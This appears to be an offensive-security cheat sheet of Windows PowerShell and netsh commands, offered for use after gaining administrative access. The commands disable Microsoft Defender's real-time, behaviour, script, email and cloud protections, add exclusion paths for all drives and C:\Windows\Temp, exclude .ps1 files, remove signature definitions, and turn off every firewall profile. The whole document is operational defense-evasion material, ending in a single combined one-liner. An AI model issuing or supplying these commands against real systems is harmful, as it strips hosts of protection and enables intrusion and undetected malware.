## Disable AV and Firewall with 2 commands

### Requirements: Administrative/System level access

#### 1) 

    Set-MpPreference -DisableRealtimeMonitoring $True

#### 2) 

    netsh advfirewall set allprofiles state off

OR

    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

#### 3) 

    powershell  -c foreach ($disk in Get-WmiObject Win32_Logicaldisk){Add-MpPreference -ExclusionPath $disk.deviceid}

OR

    Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disable Signature Checks from Defender (Won't kill the AV, but it will not alert any activity because of signature disablement)

#### execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# AV Features disable

 Disables realtime monitoring

    Set-MpPreference -DisableRealtimeMonitoring $true

 Disables scanning for downloaded files or attachments

    Set-MpPreference -DisableIOAVProtection $true

 Disable behaviour monitoring

    Set-MPPreference -DisableBehaviourMonitoring $true

 Make exclusion for a certain folder

    Add-MpPreference -ExclusionPath "C:\Windows\Temp"

 Disables cloud detection

    Set-MPPreference -DisableBlockAtFirstSeen $true

 Disables scanning of .pst and other email formats

    Set-MPPreference -DisableEmailScanning $true

 Disables script scanning during malware scans

    Set-MPPReference -DisableScriptScanning $true

 Exclude files by extension

    Set-MpPreference -ExclusionExtension "ps1"

 Turn off everything and set exclusion to "C:\Windows\Temp"

    Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"
